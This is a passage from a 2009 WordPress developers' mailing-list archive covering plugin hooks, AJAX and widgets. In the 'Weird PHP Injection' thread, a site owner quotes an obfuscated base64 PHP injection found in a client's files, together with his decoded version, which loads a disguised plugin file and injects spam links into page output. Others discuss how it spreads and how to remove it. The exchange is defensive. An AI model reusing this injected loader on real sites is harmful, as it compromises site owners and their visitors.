                    if($R6B6E98CDE8B33087A33E4D3A497BD86B&16) {
                        $R60169CD1C47B7A7A85AB44F884635E41 =
strpos($R20FD65E9C7406034FADC682F06732868,chr(0),$R60169CD1C47B7A7A85AB44F884635E41)+1;
                    }
                    if($R6B6E98CDE8B33087A33E4D3A497BD86B&2) {
                        $R60169CD1C47B7A7A85AB44F884635E41+ = 2;
                    }
                        $RC4A5B5E310ED4C323E04D72AFAE39F53 =
gzinflate(substr($R20FD65E9C7406034FADC682F06732868,$R60169CD1C47B7A7A85AB44F884635E41));

                    if($RC4A5B5E310ED4C323E04D72AFAE39F53 =  =  = FALSE) {
                        $RC4A5B5E310ED4C323E04D72AFAE39F53 =
$R20FD65E9C7406034FADC682F06732868;
                    }

                    return $RC4A5B5E310ED4C323E04D72AFAE39F53;
                }
            }

            function dgobh($RDA3E61414E50AEE968132F03D265E0CF) {

                Header('Content-Encoding: none');
                $R3E33E017CD76B9B7E6C7364FB91E2E90 =
gzdecode($RDA3E61414E50AEE968132F03D265E0CF);


if(preg_match('/\<body/si',$R3E33E017CD76B9B7E6C7364FB91E2E90)) {
                    return
preg_replace('/(\<body[^\>]*\>)/si','$1'.gml(),$R3E33E017CD76B9B7E6C7364FB91E2E90);
                } else {
                    return gml().$R3E33E017CD76B9B7E6C7364FB91E2E90;
                }
            }

            ob_start('dgobh');
        }
    }
}

I have no idea what it does and I'm not sure if the WP-phpMyAdmin plugin had
a security hole or why it's part of this code. But I deactivated it on the
client's site.

To clean it up:
I first tried just upgrading him to WP2.8.5, but as soon as I visited the
site, it re-injected all the files with that crap. So I ran this script to
remove it from all files:

find . -name '*.php' | xargs perl -pi -e "s#\<\?
/\*\*/eval\(base64_decode\('.+'\)\); \?\>##g"

Then, for good measure I re-copied all the WP2.8.5 files back over. It seems
to have fixed it for the client.

Also, for what it's worth, these are all the plugins that he had
activated...

    AddThis Social Bookmarking Widget
    Advanced Excerpt
    Akismet
    Dagon Design Form Mailer
    Event Calendar
    Lightbox 2
    NextGEN Gallery
    Search & Replace
    SEO Title Tag
    Similarity
    SimplePie Core
    SimplePie Plugin for WordPress
    Theme Switcher
    Twitter Tools
    Viper's Video Quicktags
    WP-phpMyAdmin
    wp-Table
    WP-Table Reloaded
    WPtouch iPhone Theme

I'm still digging to see if I can figure out where the actual hole was. Any
ideas?

Lew Ayotte
Full Throttle Development, LLC
706.363.0688
478.246.4627
lew at fullthrottledevelopment.com
http://fullthrottledevelopment.com
http://twitter.com/full_throttle
http://twitter.com/lewayotte

From sharon at BrewerRadio.com  Thu Oct 29 19:47:00 2009
From: sharon at BrewerRadio.com (Sharon Chambers)
Date: Thu, 29 Oct 2009 15:47:00 -0400
Subject: [wp-hackers] ajax to call function in theme
Message-ID: <97b639dc.1ca58d0.1ed0d235.2c49@BrewerRadio.com>

Realized that was a bit lacking...
Here's my simple test code following the AJAX tutorial in the codex (http://codex.wordpress.org/AJAX_in_Plugins):

<?php
$vote = $_POST['vote'];
$results_id = $_POST['results_div_id'];

global $wpdb;
$results = 'db prefix: '. $wpdb->prefix;

die( "document.getElementById('$results_id').innerHTML = '$results'" );
?>

The above produces empty string for prefix:  db prefix: 


From gaarai at gaarai.com  Thu Oct 29 19:52:49 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Thu, 29 Oct 2009 14:52:49 -0500
Subject: [wp-hackers] Hook being called twice on activate,
	once on deactivate
In-Reply-To: <001101ca58cd$61f3d470$25db7d50$@us>
References: <001101ca58cd$61f3d470$25db7d50$@us>
Message-ID: <4AE9F291.8060703@gaarai.com>

Frankly, your code is a mess.

Your register_activation_hook call is not passing the name of a function
that should be called; rather, it is directly calling the function.
That's what call_user_func does, it runs the function.

That means that when the register_activation_hook portion of the code is
encountered, it immediately executes the wpdb_test_activate function.

The reason why it is running three times when you activate and then
deactivate is because it does the following:

   1. Runs once when the activate link is clicked. WordPress basically
      tries to run it just to ensure that the code is valid and doesn't
      crash before actually activating it. This would also account for
      why $wpdb doesn't exist since it is more or less working in just a
      sandbox environment at this point.
   2. Runs again when the Plugins page reloads after having the plugin
      activated. It runs since it is now an active plugin and as all
      active plugins do, it executes.
   3. Runs again when you deactivate the plugin since a full run of the
      code executes before deactivating the plugin in order to give the
      plugin time to respond to deactivation actions.

I bet if you navigated through the site with the plugin activated, you
would see output each time as each time the code runs, the
call_user_func is executing wpdb_test_activate.

Personally, I think using a define for the table name is sloppy and
error-prone (this situation makes a case for it).

Getting back to the topic, your main issue is the call_user_func. It
should look like the following:

    register_activation_hook( __FILE__, 'wpdb_test_activate' );

Notice that you can't add any variables. All register_activation_hook
does is create an action, and you can't pass variable data to an
add_action. The idea is that variable data gets passed to the registered
function, but in this case, no parameters are passed to the registered
activation function.

Chris Jean
http://gaarai.com/
@chrisjean



mark waterous wrote:
> I was hoping somebody on here might be able to explain the following strange
> behavior I stumbled across.
>
>  
>
> I've been working on a plugin that during activation needs to create some
> tables. The table names are stored in constants for use in various locations
> around the plugins codebase, and are defined ala;
>
>  
>
> define( 'MYPLUGIN_TABLE_WHATEVER', $wpdb->prefix . 'table_whatever' );
>
>  
>
> Which works fine everywhere else in the code, returning the desired
> 'wp_#_table_whatever' string I need. Right up until the constant is used
> from inside an activation callback, at which point it drops the
> $wpdb->prefix, and I wind up with tables called only 'table_whatever' (no
> prefix). So I wrote a quick'n'dirty to try and discern what was occurring;
>
>  
>
> <?php /*
>
> Plugin Name: WPDB Object Test
>
> Description: If you only knew.
>
> Version: 0.1
>
> */
>
>  
>
> define( 'WPDB_TEST_TABLE', $wpdb->prefix . 'table_name' );
>
>  
>
> $outside_data = WPDB_TEST_TABLE;
>
>  
>
> function wpdb_test_activate( $outside_data ) {
>
>                 global $wpdb;
>
>  
>
>                 $file = dirname( __FILE__ ) . '/test.log';
>
>  
>
>                 $data = 'Outside: ' . $outside_data . "\n";
>
>                 $data .= 'Constant: ' .WPDB_TEST_TABLE . "\n";
>
>                 $data .= 'Inside: ' . $wpdb->prefix . "table_name\n\n";
>
>  
>
>                 $fp = @fopen( $file, 'a' );
>
>                 if ( $fp )
>
>                                 fwrite( $fp, $data );
>
>                 fclose( $fp );
>
> }
>
>  
>
> register_activation_hook( __FILE__, call_user_func( 'wpdb_test_activate',
> $outside_data ) );
>
> ?>
>
>  
>
> This resulted in behavior I wasn't expecting - it would appear that the hook
> runs twice on activation. The first run strips $wpdb->prefix, the second
> time it doesn't. It also runs the activation hook again on deactivation.
> Should it be doing that? The actual plugin has a deactivation hook of
> course, but I wasn't expecting it to run the activation hook in absence of
> this.
>
>  
>
> My test.log file looks like this, though you could run it for yourself to be
> sure (the first two groups are from activation, the third from
> deactivation):
>
>  
>
> <test.log>
>
> Outside: table_name
>
> Constant: table_name
>
> Inside: wp_3_table_name
>
>  
>
> Outside: wp_3_table_name
>
> Constant: wp_3_table_name
>
> Inside: wp_3_table_name
>
>  
>
> Outside: wp_3_table_name
>
> Constant: wp_3_table_name
>
> Inside: wp_3_table_name
>
> </test.log>
>
>  
>
> (sorry about the long post, and this apology that makes it even longer)
>
>  
>
> --
>
> Mark Waterous
>
>  <http://mark.watero.us/> http://mark.watero.us/ ( <mailto:mark at watero.us>
> mark at watero.us) 
>
>  
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>   

From otto at ottodestruct.com  Thu Oct 29 19:54:17 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 29 Oct 2009 14:54:17 -0500
Subject: [wp-hackers] Weird PHP Injection
In-Reply-To: <160203ed0910291245h7eac276em3a1af771fb8abbaf@mail.gmail.com>
References: <160203ed0910291245h7eac276em3a1af771fb8abbaf@mail.gmail.com>
Message-ID: <161617690910291254w616be287kcb94fe67a6f4d940@mail.gmail.com>

On Thu, Oct 29, 2009 at 2:45 PM, Lew Ayotte - Full Throttle
Development <lew at fullthrottledevelopment.com> wrote:
> I'm not sure if anyone has seen this before... except for this guy:
> http://wordpress.org/support/topic/320918?replies=8
>
> But I just ran into an issue with a client using WP2.8.4. It seems like
> every single file in WP (including themes and plugins) had this injected at
> the top:

In the cases where I've seen all files hit like this, then I've always
discovered two things.

1. The server is a shared host (many websites, same server).
2. The server itself is insecure (the web user can easily write to all
the web facing files).

The usual method of entry is for some site (any site) on that shared
server to get hacked. The attacker then runs a piece of code which
simply recursively searches all sites on that system and adds its
malicious code to them all that fit some pattern (like *.php, for
example).

Well setup shared servers don't have this problem. A server running
suPHP, for example, would prevent this sort of attack because the php
processes run under the user account, not the generic web account. So
when the attacker gains privileges, he's running as the generic user
who doesn't have the same kind of access that the "web" user does.

My advice: Switch hosts. A host that can't properly configure their
systems is not one worth sticking with.

-Otto
Sent from Memphis, TN, United States

From mark at watero.us  Thu Oct 29 19:58:03 2009
From: mark at watero.us (mark waterous)
Date: Thu, 29 Oct 2009 12:58:03 -0700
Subject: [wp-hackers] Hook being called twice on activate,
	once on deactivate
In-Reply-To: <349fe48b0910291239h579d2a5cn377ef30e6bc1dc48@mail.gmail.com>
References: <001101ca58cd$61f3d470$25db7d50$@us>
	<349fe48b0910291239h579d2a5cn377ef30e6bc1dc48@mail.gmail.com>
Message-ID: <001701ca58d2$20856530$61902f90$@us>

That fixes the constant returning the proper string, but is the activation
hook supposed to be run twice like that? And again on deactivation if there
is no deactivation hook?

--
Mark (http://mark.watero.us/)


> -----Original Message-----
> Sent: Thursday, October 29, 2009 12:39 PM
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Hook being called twice on activate, once on
> deactivate
> 
> A solution might be to summon wpdb, before defining the constant:
> 
> global $wpdb;
> 
> I assume your problem is caused by the different scope that the plugin
> is activated in.
> 
> --
> http://scribu.net


From gaarai at gaarai.com  Thu Oct 29 20:01:50 2009
From: gaarai at gaarai.com (Chris Jean)
Date: Thu, 29 Oct 2009 15:01:50 -0500
Subject: [wp-hackers] Weird PHP Injection
In-Reply-To: <160203ed0910291245h7eac276em3a1af771fb8abbaf@mail.gmail.com>
References: <160203ed0910291245h7eac276em3a1af771fb8abbaf@mail.gmail.com>
Message-ID: <4AE9F4AE.30301@gaarai.com>

I've seen this a lot lately. It's actually not just limited to WordPress
since I've seen it in PHP-based forum software as well. While the code
may not be exactly the same, it is similar enough to tell me that it is
either the same family of code or a derivative.

In the forum case, an bug was exploited that allowed the attacker to
load PHP code through an uploaded image that didn't filter against PHP
files being uploaded. This initial PHP code goes through all the PHP
files it can find on the site and adds the code similar to what you have
below to them.

As seen in your partial decode, the code in each of the files calls the
origin code each time to ensure that all new or cleaned up PHP files are
remodified, thus making it hard to remove unless you find that origin
file and remove it first.

I've yet to determine exactly how WordPress sites pick this up, but I
wouldn't be surprised if it isn't through a similar process of being
able to upload a PHP file to the server through a bugged piece of code.
It is possible that a different method is used and that it is through
compromised FTP, SSH, etc credentials or through shared hosting with
poor security that doesn't prevent the spread of files between different
hosting accounts.

Every time I've seen code like this, it does nothing more than inject a
hidden link farm into the content of the site. So, it's destructive to
the search engine rankings of the exploited site, but I have yet to see
it attempt to be anything more dangerous than that.

Chris Jean
http://gaarai.com/
@chrisjean



Lew Ayotte - Full Throttle Development wrote:
> I'm not sure if anyone has seen this before... except for this guy:
> http://wordpress.org/support/topic/320918?replies=8
>
> But I just ran into an issue with a client using WP2.8.4. It seems like
> every single file in WP (including themes and plugins) had this injected at
> the top:
>
> <?
> /**/eval(base64_decode('aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ3NoX25vJ10pKXskR0xPQkFMU1snc2hfbm8nXT0xO2lmKGZpbGVfZXhpc3RzKCcvdmFyL3d3dy9odG1sL3dwLWNvbnRlbnQvcGx1Z2lucy93cC1waHBteWFkbWluL3BocG15YWRtaW4vcG1kL3N0eWxlcy9kZWZhdWx0L2ltYWdlcy9zdHlsZS5jc3MucGhwJykpe2luY2x1ZGVfb25jZSgnL3Zhci93d3cvaHRtbC93cC1jb250ZW50L3BsdWdpbnMvd3AtcGhwbXlhZG1pbi9waHBteWFkbWluL3BtZC9zdHlsZXMvZGVmYXVsdC9pbWFnZXMvc3R5bGUuY3NzLnBocCcpO2lmKGZ1bmN0aW9uX2V4aXN0cygnZ21sJykmJiFmdW5jdGlvbl9leGlzdHMoJ2Rnb2JoJykpe2lmKCFmdW5jdGlvbl9leGlzdHMoJ2d6ZGVjb2RlJykpe2Z1bmN0aW9uIGd6ZGVjb2RlKCRSMjBGRDY1RTlDNzQwNjAzNEZBREM2ODJGMDY3MzI4NjgpeyRSNkI2RTk4Q0RFOEIzMzA4N0EzM0U0RDNBNDk3QkQ4NkI9b3JkKHN1YnN0cigkUjIwRkQ2NUU5Qzc0MDYwMzRGQURDNjgyRjA2NzMyODY4LDMsMSkpOyRSNjAxNjlDRDFDNDdCN0E3QTg1QUI0NEY4ODQ2MzVFNDE9MTA7JFIwRDU0MjM2REEyMDU5NEVDMTNGQzgxQjIwOTczMzkzMT0wO2lmKCRSNkI2RTk4Q0RFOEIzMzA4N0EzM0U0RDNBNDk3QkQ4NkImNCl7JFIwRDU0MjM2REEyMDU5NEVDMTNGQzgxQjIwOTczMzkzMT11bnBhY2soJ3YnLHN1YnN0cigkUjIwRkQ2NUU5Qzc0MDYwMz
>  RGQURDNjgyRjA2NzMyODY4LDEwLDIpKTskUjBENTQyMzZEQTIwNTk0RUMxM0ZDODFCMjA5NzMzOTMxPSRSMEQ1NDIzNkRBMjA1OTRFQzEzRkM4MUIyMDk3MzM5MzFbMV07JFI2MDE2OUNEMUM0N0I3QTdBODVBQjQ0Rjg4NDYzNUU0MSs9MiskUjBENTQyMzZEQTIwNTk0RUMxM0ZDODFCMjA5NzMzOTMxO31pZigkUjZCNkU5OENERThCMzMwODdBMzNFNEQzQTQ5N0JEODZCJjgpeyRSNjAxNjlDRDFDNDdCN0E3QTg1QUI0NEY4ODQ2MzVFNDE9c3RycG9zKCRSMjBGRDY1RTlDNzQwNjAzNEZBREM2ODJGMDY3MzI4NjgsY2hyKDApLCRSNjAxNjlDRDFDNDdCN0E3QTg1QUI0NEY4ODQ2MzVFNDEpKzE7fWlmKCRSNkI2RTk4Q0RFOEIzMzA4N0EzM0U0RDNBNDk3QkQ4NkImMTYpeyRSNjAxNjlDRDFDNDdCN0E3QTg1QUI0NEY4ODQ2MzVFNDE9c3RycG9zKCRSMjBGRDY1RTlDNzQwNjAzNEZBREM2ODJGMDY3MzI4NjgsY2hyKDApLCRSNjAxNjlDRDFDNDdCN0E3QTg1QUI0NEY4ODQ2MzVFNDEpKzE7fWlmKCRSNkI2RTk4Q0RFOEIzMzA4N0EzM0U0RDNBNDk3QkQ4NkImMil7JFI2MDE2OUNEMUM0N0I3QTdBODVBQjQ0Rjg4NDYzNUU0MSs9Mjt9JFJDNEE1QjVFMzEwRUQ0QzMyM0UwNEQ3MkFGQUUzOUY1Mz1nemluZmxhdGUoc3Vic3RyKCRSMjBGRDY1RTlDNzQwNjAzNEZBREM2ODJGMDY3MzI4NjgsJFI2MDE2OUNEMUM0N0I3QTdBODVBQjQ0Rjg4NDYzNUU0MSkpO2lmKCRSQzRBNUI1RTMxMEVENEMzMjNFMDRENzJBRkFFMzlGNTM
>  9PT1GQUxTRSl7JFJDNEE1QjVFMzEwRUQ0QzMyM0UwNEQ3MkFGQUUzOUY1Mz0kUjIwRkQ2NUU5Qzc0MDYwMzRGQURDNjgyRjA2NzMyODY4O31yZXR1cm4gJFJDNEE1QjVFMzEwRUQ0QzMyM0UwNEQ3MkFGQUUzOUY1Mzt9fWZ1bmN0aW9uIGRnb2JoKCRSREEzRTYxNDE0RTUwQUVFOTY4MTMyRjAzRDI2NUUwQ0Ype0hlYWRlcignQ29udGVudC1FbmNvZGluZzogbm9uZScpOyRSM0UzM0UwMTdDRDc2QjlCN0U2QzczNjRGQjkxRTJFOTA9Z3pkZWNvZGUoJFJEQTNFNjE0MTRFNTBBRUU5NjgxMzJGMDNEMjY1RTBDRik7aWYocHJlZ19tYXRjaCgnL1w8Ym9keS9zaScsJFIzRTMzRTAxN0NENzZCOUI3RTZDNzM2NEZCOTFFMkU5MCkpe3JldHVybiBwcmVnX3JlcGxhY2UoJy8oXDxib2R5W15cPl0qXD4pL3NpJywnJDEnLmdtbCgpLCRSM0UzM0UwMTdDRDc2QjlCN0U2QzczNjRGQjkxRTJFOTApO31lbHNle3JldHVybiBnbWwoKS4kUjNFMzNFMDE3Q0Q3NkI5QjdFNkM3MzY0RkI5MUUyRTkwO319b2Jfc3RhcnQoJ2Rnb2JoJyk7fX19'));
> ?>
>
>
> Which I decoded and prettied up for everyone:
>
> if(function_exists('ob_start')&&!isset($GLOBALS['sh_no'])) {
>     $GLOBALS['sh_no'] = 1;
>
> if(file_exists('/var/www/html/wp-content/plugins/wp-phpmyadmin/phpmyadmin/pmd/styles/default/images/style.css.php'))
> {
>
> include_once('/var/www/html/wp-content/plugins/wp-phpmyadmin/phpmyadmin/pmd/styles/default/images/style.css.php');
>
>         if(function_exists('gml')&&!function_exists('dgobh')) {
>
>             if(!function_exists('gzdecode')) {
>
>                 function gzdecode($R20FD65E9C7406034FADC682F06732868) {
>
>                     $R6B6E98CDE8B33087A33E4D3A497BD86B =
> ord(substr($R20FD65E9C7406034FADC682F06732868,3,1));
>                     $R60169CD1C47B7A7A85AB44F884635E41 = 10;
>                     $R0D54236DA20594EC13FC81B209733931 = 0;
>
>                     if($R6B6E98CDE8B33087A33E4D3A497BD86B&4) {
>                         $R0D54236DA20594EC13FC81B209733931 =
> unpack('v',substr($R20FD65E9C7406034FADC682F06732868,10,2));
>                         $R0D54236DA20594EC13FC81B209733931 =
> $R0D54236DA20594EC13FC81B209733931[1];
>                         $R60169CD1C47B7A7A85AB44F884635E41+ =
> 2+$R0D54236DA20594EC13FC81B209733931;
>                     }
>
>                     if($R6B6E98CDE8B33087A33E4D3A497BD86B&8) {
>                         $R60169CD1C47B7A7A85AB44F884635E41 =
> strpos($R20FD65E9C7406034FADC682F06732868,chr(0),$R60169CD1C47B7A7A85AB44F884635E41)+1;
>                     }
>                     if($R6B6E98CDE8B33087A33E4D3A497BD86B&16) {
>                         $R60169CD1C47B7A7A85AB44F884635E41 =
> strpos($R20FD65E9C7406034FADC682F06732868,chr(0),$R60169CD1C47B7A7A85AB44F884635E41)+1;
>                     }
>                     if($R6B6E98CDE8B33087A33E4D3A497BD86B&2) {
>                         $R60169CD1C47B7A7A85AB44F884635E41+ = 2;
>                     }
>                         $RC4A5B5E310ED4C323E04D72AFAE39F53 =
> gzinflate(substr($R20FD65E9C7406034FADC682F06732868,$R60169CD1C47B7A7A85AB44F884635E41));
>
>                     if($RC4A5B5E310ED4C323E04D72AFAE39F53 =  =  = FALSE) {
>                         $RC4A5B5E310ED4C323E04D72AFAE39F53 =
> $R20FD65E9C7406034FADC682F06732868;
>                     }
>
>                     return $RC4A5B5E310ED4C323E04D72AFAE39F53;
>                 }
>             }
>
>             function dgobh($RDA3E61414E50AEE968132F03D265E0CF) {
>
>                 Header('Content-Encoding: none');
>                 $R3E33E017CD76B9B7E6C7364FB91E2E90 =
> gzdecode($RDA3E61414E50AEE968132F03D265E0CF);
>
>
> if(preg_match('/\<body/si',$R3E33E017CD76B9B7E6C7364FB91E2E90)) {
>                     return
> preg_replace('/(\<body[^\>]*\>)/si','$1'.gml(),$R3E33E017CD76B9B7E6C7364FB91E2E90);
>                 } else {
>                     return gml().$R3E33E017CD76B9B7E6C7364FB91E2E90;
>                 }
>             }
>
>             ob_start('dgobh');
>         }
>     }
> }
>
> I have no idea what it does and I'm not sure if the WP-phpMyAdmin plugin had
> a security hole or why it's part of this code. But I deactivated it on the
> client's site.
>
> To clean it up:
> I first tried just upgrading him to WP2.8.5, but as soon as I visited the
> site, it re-injected all the files with that crap. So I ran this script to
> remove it from all files:
>
> find . -name '*.php' | xargs perl -pi -e "s#\<\?
> /\*\*/eval\(base64_decode\('.+'\)\); \?\>##g"
>
> Then, for good measure I re-copied all the WP2.8.5 files back over. It seems
> to have fixed it for the client.
>
> Also, for what it's worth, these are all the plugins that he had
> activated...
>
>     AddThis Social Bookmarking Widget
>     Advanced Excerpt
>     Akismet
>     Dagon Design Form Mailer
>     Event Calendar
>     Lightbox 2
>     NextGEN Gallery
>     Search & Replace
>     SEO Title Tag
>     Similarity
>     SimplePie Core
>     SimplePie Plugin for WordPress
>     Theme Switcher
>     Twitter Tools
>     Viper's Video Quicktags
>     WP-phpMyAdmin
>     wp-Table
>     WP-Table Reloaded
>     WPtouch iPhone Theme
>
> I'm still digging to see if I can figure out where the actual hole was. Any
> ideas?
>
> Lew Ayotte
> Full Throttle Development, LLC
> 706.363.0688
> 478.246.4627
> lew at fullthrottledevelopment.com
> http://fullthrottledevelopment.com
> http://twitter.com/full_throttle
> http://twitter.com/lewayotte
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>   


From CaptainN at unFocus.com  Thu Oct 29 20:03:07 2009
From: CaptainN at unFocus.com (Kevin Newman)
Date: Thu, 29 Oct 2009 16:03:07 -0400
Subject: [wp-hackers] widget wp_options problems (disappearing widgets)
Message-ID: <4AE9F4FB.5010909@unFocus.com>

I recently had a problem with widgets disappearing from Wordpress.

I found a fix, if not the cause (I suspect it's old values that were not 
cleaned up in recent wordpress upgrades - shot in total darkness).

The problem was that for some reason, my values prevented the widget 
from showing up in the admin widget page. In a freshly installed 
Wordpress, the value is the same for every widget: 
a:2:{i:2;a:0:{}s:12:"_multiwidget";i:1;}

It doesn't seem to change when you move things around, and change 
settings, but my old blog has all kinds of varying info there.

The question is, should wordpress be updating these to the new default 
value? If so, it's an upgrade bug, and can easily be worked out in the 
next minor update.

If not, maybe we can setup a reset widget button - similar to the one 
that Justin Tadlock created with the "Widget Reset" plugin (which didn't 
work to fix this problem).

Again, resetting the widget_*** option in wp_options seems to have fixed 
my issue with disappearing widgets.

Anything that sheds light on this problem would be appreciated.

Thanks,

Kevin N.



From otto at ottodestruct.com  Thu Oct 29 20:02:52 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 29 Oct 2009 15:02:52 -0500
Subject: [wp-hackers] ajax to call function in theme
In-Reply-To: <97b639dc.1ca58d0.1ed0d235.2c49@BrewerRadio.com>
References: <97b639dc.1ca58d0.1ed0d235.2c49@BrewerRadio.com>
Message-ID: <161617690910291302m22e34275wc641ba92dc0c8cf3@mail.gmail.com>

Let me guess: You put this server side code into some separate PHP
file somewhere, and now are calling that PHP file directly from your
AJAX call, yes?

I suggest you re-read that tutorial, because that's exactly what you
*don't* do, and the tutorial explains why.


Here's a short example. All this will be in one file.

function my_action_javascript( )
{
   var mysack = new sack(
       "<?php bloginfo( 'wpurl' ); ?>/wp-admin/admin-ajax.php" );
  mysack.execute = 1;
  mysack.method = 'POST';
  mysack.setVar( "action", "my_special_action" );
  mysack.setVar( "whatever", '1234' );
  mysack.onError = function() { alert('error' )};
  mysack.runAJAX();
  return true;
}

add_action('wp_ajax_nopriv_my_special_action', 'my_action_callback');

function my_action_callback() {
  $whatever = $_POST['whatever'];
 // $whatever here will be 1234.. See?
}


Take special note of the javascript code which has an "action"
variable. Also take note that it is calling the admin-ajax.php file,
not some other file that you created. Then note that my_special_action
is part of the first parameter in the add_action call. These are all
significant.

-Otto
Sent from Memphis, TN, United States


On Thu, Oct 29, 2009 at 2:47 PM, Sharon Chambers <sharon at brewerradio.com> wrote:
> Realized that was a bit lacking...
> Here's my simple test code following the AJAX tutorial in the codex (http://codex.wordpress.org/AJAX_in_Plugins):
>
> <?php
> $vote = $_POST['vote'];
> $results_id = $_POST['results_div_id'];
>
> global $wpdb;
> $results = 'db prefix: '. $wpdb->prefix;
>
> die( "document.getElementById('$results_id').innerHTML = '$results'" );
> ?>
>
> The above produces empty string for prefix: ?db prefix:
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From if.website at gmail.com  Thu Oct 29 20:05:22 2009
From: if.website at gmail.com (Austin Matzko)
Date: Thu, 29 Oct 2009 15:05:22 -0500
Subject: [wp-hackers] ajax to call function in theme
In-Reply-To: <161617690910291302m22e34275wc641ba92dc0c8cf3@mail.gmail.com>
References: <97b639dc.1ca58d0.1ed0d235.2c49@BrewerRadio.com>
	<161617690910291302m22e34275wc641ba92dc0c8cf3@mail.gmail.com>
Message-ID: <674b4a3b0910291305m5f57e4ax270f31d40eec6f9d@mail.gmail.com>

On Thu, Oct 29, 2009 at 3:02 PM, Otto <otto at ottodestruct.com> wrote:
> Let me guess: You put this server side code into some separate PHP
> file somewhere, and now are calling that PHP file directly from your
> AJAX call, yes?
>
> I suggest you re-read that tutorial, because that's exactly what you
> *don't* do, and the tutorial explains why.

Unfortunately, the tutorial *does* suggest that very thing for the
modified example:

> We need to send our request to a plugin PHP file. This could be the main plugin PHP file, or a separate PHP file. It's probably a little cleaner to do it in a separate file, which we'll assume is called "myplugin_ajax.php", located in the standard wp-content/plugins directory of Wordpress.

From otto at ottodestruct.com  Thu Oct 29 20:07:28 2009
From: otto at ottodestruct.com (Otto)
Date: Thu, 29 Oct 2009 15:07:28 -0500
Subject: [wp-hackers] ajax to call function in theme
In-Reply-To: <674b4a3b0910291305m5f57e4ax270f31d40eec6f9d@mail.gmail.com>
References: <97b639dc.1ca58d0.1ed0d235.2c49@BrewerRadio.com> 
	<161617690910291302m22e34275wc641ba92dc0c8cf3@mail.gmail.com> 
	<674b4a3b0910291305m5f57e4ax270f31d40eec6f9d@mail.gmail.com>
Message-ID: <161617690910291307n7c136e50iaabaab5742249162@mail.gmail.com>

That should probably be clarified then. If you're going to send AJAX
requests to separate files, then those separate files have absolutely
no visibility to any part of WordPress at all.

The normal case should be the action method, because you probably want
to access WordPress or the database, in some manner.


-Otto
Sent from Memphis, TN, United States


On Thu, Oct 29, 2009 at 3:05 PM, Austin Matzko <if.website at gmail.com> wrote:
> On Thu, Oct 29, 2009 at 3:02 PM, Otto <otto at ottodestruct.com> wrote:
>> Let me guess: You put this server side code into some separate PHP
>> file somewhere, and now are calling that PHP file directly from your
>> AJAX call, yes?
>>
>> I suggest you re-read that tutorial, because that's exactly what you
>> *don't* do, and the tutorial explains why.
>
> Unfortunately, the tutorial *does* suggest that very thing for the
> modified example:
>
>> We need to send our request to a plugin PHP file. This could be the main plugin PHP file, or a separate PHP file. It's probably a little cleaner to do it in a separate file, which we'll assume is called "myplugin_ajax.php", located in the standard wp-content/plugins directory of Wordpress.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From if.website at gmail.com  Thu Oct 29 20:10:03 2009
From: if.website at gmail.com (Austin Matzko)
Date: Thu, 29 Oct 2009 15:10:03 -0500
Subject: [wp-hackers] Hook being called twice on activate,
	once on 	deactivate
In-Reply-To: <001701ca58d2$20856530$61902f90$@us>
References: <001101ca58cd$61f3d470$25db7d50$@us>
	<349fe48b0910291239h579d2a5cn377ef30e6bc1dc48@mail.gmail.com>
	<001701ca58d2$20856530$61902f90$@us>
Message-ID: <674b4a3b0910291310x7a752750rc5002624caf5fbd5@mail.gmail.com>

On Thu, Oct 29, 2009 at 2:58 PM, mark waterous <mark at watero.us> wrote:
> That fixes the constant returning the proper string, but is the activation
> hook supposed to be run twice like that? And again on deactivation if there
> is no deactivation hook?

The *activation hook* is not being called during those times; the
*call_user_func()* call is.

Each time:

1. Test include of plugin file to check for fatal errors, immediately
prior to activation.
2. Actual include of plugin file because it's activated.
3. Include of plugin file just prior to deactivation.

From if.website at gmail.com  Thu Oct 29 20:11:37 2009
From: if.website at gmail.com (Austin Matzko)
Date: Thu, 29 Oct 2009 15:11:37 -0500
Subject: [wp-hackers] ajax to call function in theme
In-Reply-To: <161617690910291307n7c136e50iaabaab5742249162@mail.gmail.com>
References: <97b639dc.1ca58d0.1ed0d235.2c49@BrewerRadio.com>
	<161617690910291302m22e34275wc641ba92dc0c8cf3@mail.gmail.com>
	<674b4a3b0910291305m5f57e4ax270f31d40eec6f9d@mail.gmail.com>
	<161617690910291307n7c136e50iaabaab5742249162@mail.gmail.com>
Message-ID: <674b4a3b0910291311q70b1fe82l8d2990b53e6a0efc@mail.gmail.com>

On Thu, Oct 29, 2009 at 3:07 PM, Otto <otto at ottodestruct.com> wrote:
> That should probably be clarified then. If you're going to send AJAX
> requests to separate files, then those separate files have absolutely
> no visibility to any part of WordPress at all.
>
> The normal case should be the action method, because you probably want
> to access WordPress or the database, in some manner.

I agree.  It's a bad example, and there's not even any mention of
using wp-load.php, which is meant for people who insist on doing it
that way anyways.

From sharon at BrewerRadio.com  Thu Oct 29 20:14:00 2009
From: sharon at BrewerRadio.com (Sharon Chambers)
Date: Thu, 29 Oct 2009 16:14:00 -0400
Subject: [wp-hackers] ajax to call function in theme
Message-ID: <5a7034dc.1ca58d4.1ee9774a.3c61@BrewerRadio.com>

Gotcha.  Thanks for clarifying.


-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Otto
Sent: Thursday, October 29, 2009 4:07 PM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] ajax to call function in theme

That should probably be clarified then. If you're going to send AJAX
requests to separate files, then those separate files have absolutely
no visibility to any part of WordPress at all.

The normal case should be the action method, because you probably want
to access WordPress or the database, in some manner.


-Otto
Sent from Memphis, TN, United States



From lew at fullthrottledevelopment.com  Thu Oct 29 20:23:39 2009
From: lew at fullthrottledevelopment.com (Lew Ayotte - Full Throttle Development)
Date: Thu, 29 Oct 2009 16:23:39 -0400
